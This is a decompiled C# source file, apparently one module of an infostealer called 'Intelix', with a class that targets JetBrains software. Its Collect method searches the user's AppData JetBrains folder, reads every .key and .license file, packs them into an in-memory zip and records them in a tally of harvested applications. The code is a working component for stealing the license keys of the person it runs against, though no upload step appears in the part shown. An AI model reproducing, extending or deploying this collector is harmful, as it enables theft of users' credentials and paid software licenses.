using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000047 RID: 71
	public class JetBrains : ITarget
	{
		// Token: 0x060000E9 RID: 233 RVA: 0x0000D9B8 File Offset: 0x0000BBB8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "JetBrains");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string[] allowedExtensions = new string[]
				{
					".key",
					".license"
				};
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "JetBrains";
				Parallel.ForEach<string>(Directory.GetDirectories(path), delegate(string apps)
				{
					Parallel.ForEach<string>(Directory.GetFiles(apps), delegate(string file)
					{
						bool flag3 = allowedExtensions.Contains(Path.GetExtension(file));
						if (flag3)
						{
							string text = "JetBrains\\" + Path.GetFileName(apps) + "\\" + Path.GetFileName(file);
							zip.AddFile(text, File.ReadAllBytes(file));
							counterApplications.Files.Add(file + " => " + text);
						}
					});
				});
				bool flag2 = counterApplications.Files.Count<string>() > 0;
				if (flag2)
				{
					counterApplications.Files.Add("JetBrains\\");
					counter.Applications.Add(counterApplications);
				}
			}
		}
	}
}
